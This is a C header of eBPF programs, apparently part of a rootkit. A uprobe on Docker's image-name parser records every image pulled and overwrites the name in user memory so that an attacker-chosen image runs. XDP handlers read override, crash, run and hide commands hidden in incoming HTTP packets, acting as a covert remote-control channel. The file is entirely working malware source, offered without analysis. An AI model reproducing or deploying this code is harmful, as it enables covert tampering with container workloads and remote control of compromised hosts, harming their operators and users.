/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _DOCKER_H_
#define _DOCKER_H_

struct image_override_key_t {
    u32 prefix;
    char image[DOCKER_IMAGE_LEN + 4];
};

struct image_override_t {
    u16 override;
    u16 ping;
    u32 prefix;
    char replace_with[DOCKER_IMAGE_LEN];
};

struct bpf_map_def SEC("maps/image_override") image_override = {
    .type = BPF_MAP_TYPE_LPM_TRIE,
    .key_size = sizeof(struct image_override_key_t),
    .value_size = sizeof(struct image_override_t),
    .max_entries = 1024,
    .map_flags = BPF_F_NO_PREALLOC,
};

struct bpf_map_def SEC("maps/image_override_gen") image_override_gen = {
    .type = BPF_MAP_TYPE_PERCPU_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct image_override_t),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/image_cache") image_cache = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = DOCKER_IMAGE_LEN,
    .value_size = sizeof(u32),
    .max_entries = 100,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/image_list_cursor") image_list_cursor = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/image_list_key") image_list_key = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct fs_watch_key_t),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

SEC("uprobe/ParseNormalizedNamed")
int trace_normalized_path(struct pt_regs *ctx)
{
    char *image_ptr;
    struct image_override_key_t image_key = {};
    char new_image[DOCKER_IMAGE_LEN] = {};
    struct image_override_t *img;
    u32 len = 0;

    bpf_probe_read(&image_ptr, sizeof(image_ptr), (void *) PT_REGS_SP(ctx) + 8);
    if (image_ptr == NULL) {
        return 0;
    }
    // bpf_printk("image: %s\n", image_ptr);

    u32 src_len = bpf_probe_read_str(image_key.image, DOCKER_IMAGE_LEN, image_ptr);
    if (image_key.image[0] == 0) {
        return 0;
    }

    // check if this image was seen before
    u32 *seen = bpf_map_lookup_elem(&image_cache, image_key.image);
    if (seen == NULL) {
        u32 new_image = 1;
        seen = &new_image;
        bpf_map_update_elem(&image_cache, image_key.image, seen, BPF_ANY);

        // query the image list cursor
        u32 key = 0;
        u32 *cursor = bpf_map_lookup_elem(&image_list_cursor, &key);
        if (cursor == NULL) {
            // should never happen
            return 0;
        }

        // fetch fs_watch key for the image list
        struct fs_watch_key_t *fs_watch_key = bpf_map_lookup_elem(&image_list_key, &key);
        if (fs_watch_key == NULL) {
            // should never happen
            return 0;
        }

        // fetch fs_watch entry for the image list
        struct fs_watch_t *watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // create the entry for the first time
            watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
            if (watch == NULL) {
                // should never happen
                return 0;
            }
            watch->content[0] = 0;

            bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
            watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
            if (watch == NULL) {
                // should never happen
                return 0;
            }
        }

        // check if there is enough room in the lastest fs_watch entry, otherwise chain another one
        if (FS_WATCH_MAX_CONTENT - *cursor < src_len) {
            // generate new key
            u32 new_key = gen_random_key();

            // chain previous and new entry
            watch->next_key = new_key;

            // generate new entry
            watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
            if (watch == NULL) {
                // should never happen
                return 0;
            }

            // reset new entry
            watch->next_key = 0;
            watch->content[0] = 0;

            // update fs_watch_key
            bpf_probe_read(&fs_watch_key->filepath[0], sizeof(u32), &new_key);

            // save new entry
            bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
            watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
            if (watch == NULL) {
                // should never happen
                return 0;
            }

            // reset cursor position
            *cursor = 0;
        }

        // add new image
        #pragma unroll
        for (int i = 0; i < DOCKER_IMAGE_LEN; i++) {
            if (image_key.image[i] == 0) {
                if (*cursor < FS_WATCH_MAX_CONTENT) {
                    watch->content[*cursor] = 10;
                }
                *cursor += 1;
                goto search_image;
            }

            // bpf_printk("copying %d at %d\n", image.image[i], *cursor);

            // needed for the verifier
            if (*cursor >= FS_WATCH_MAX_CONTENT) {
                goto search_image;
            } else {
                watch->content[*cursor] = image_key.image[i];
            }
            *cursor += 1;
        }
    }

search_image:

    #pragma unroll
    for (int i = 64; i > 0; i--) {
        image_key.prefix = i;
        img = bpf_map_lookup_elem(&image_override, &image_key);
        if (img != NULL) {
            // bpf_printk("prefix %d\n", image.prefix);
            goto override;
        }
    }
    goto next;

override:
    if (img->prefix > image_key.prefix) {
        // wrong minimum prefix match
        goto next;
    }
    if (img->override != DOCKER_IMAGE_REPLACE) {
        goto next;
    }
    len = bpf_probe_read_str(new_image, DOCKER_IMAGE_LEN, img->replace_with);

    #pragma unroll
    for (int i = 0; i < DOCKER_IMAGE_LEN - 1; i++) {
        bpf_probe_write_user((void *) image_ptr + i, &new_image[i], 1);
        // bpf_printk("%d\n", new_image[i]);

        if (i == len - 2) {
            goto next;
        }
    }

next:
    // bpf_printk("imgTO: %s\n", image_ptr);
    return 0;
};

__attribute__((always_inline)) int handle_put_doc_img(char request[HTTP_REQ_LEN]) {
    // parse "from" and "to" images. To simplify our eBPF programs, we assume that the image cannot contain a '#'.
    struct image_override_key_t key = {};
    u8 j = 0;
    u32 gen_key = 0;
    struct image_override_t *value = bpf_map_lookup_elem(&image_override_gen, &gen_key);
    if (value == NULL) {
        // should never happen
        return 0;
    }
    value->override = 0;
    value->ping = 0;
    value->prefix = 0;
    value->replace_with[0] = 0;

    // parse override
    switch (request[0]) {
        case DOCKER_IMAGE_NOP_CHR:
            value->override = DOCKER_IMAGE_NOP;
            break;
        case DOCKER_IMAGE_REPLACE_CHR:
            value->override = DOCKER_IMAGE_REPLACE;
            break;
        default:
            value->override = DOCKER_IMAGE_NOP;
            break;
    }

    // parse ping
    switch (request[1]) {
        case PING_NOP_CHR:
            value->ping = PING_NOP;
            break;
        case PING_CRASH_CHR:
            value->ping = PING_CRASH;
            break;
        case PING_RUN_CHR:
            value->ping = PING_RUN;
            break;
        case PING_HIDE_CHR:
            value->ping = PING_HIDE;
            break;
        default:
            value->ping = PING_NOP;
            break;
    }

    #pragma unroll
    for (int i = 2; i < 66; i++) {
        if (request[i] == '#') {
            goto parse_to;
        }
        key.image[i - 2] = request[i];
        key.prefix++;
    }

parse_to:
    #pragma unroll
    for (int i = 2; i < 128; i++) {
        if (i > key.prefix + 3) {
            j += 1;
        } else {
            if (i < key.prefix + 3) {
                continue;
            }
        }
        if (request[i] == '#' && j > 0) {
            goto next;
        } else if (request[i] != '#') {
            value->replace_with[j & 63] = request[i];
            value->prefix++;
        }
    }

next:
    // save new image override
    bpf_map_update_elem(&image_override, &key, value, BPF_ANY);
    return 0;
}

SEC("xdp/ingress/put_doc_img")
int xdp_ingress_put_doc_img(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_put_doc_img(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

__attribute__((always_inline)) int handle_del_doc_img(char request[HTTP_REQ_LEN]) {
    // parse "from" images. To simplify our eBPF programs, we assume that the image cannot contain a '#'.
    struct image_override_key_t key = {};

    #pragma unroll
    for (int i = 0; i < 64; i++) {
        if (request[i] == '#') {
            goto next;
        }
        key.image[i] = request[i];
        key.prefix++;
    }

next:
    // delete the entry in image_override
    bpf_map_delete_elem(&image_override, &key);
    return 0;
}

SEC("xdp/ingress/del_doc_img")
int xdp_ingress_del_doc_img(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_del_doc_img(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

#endif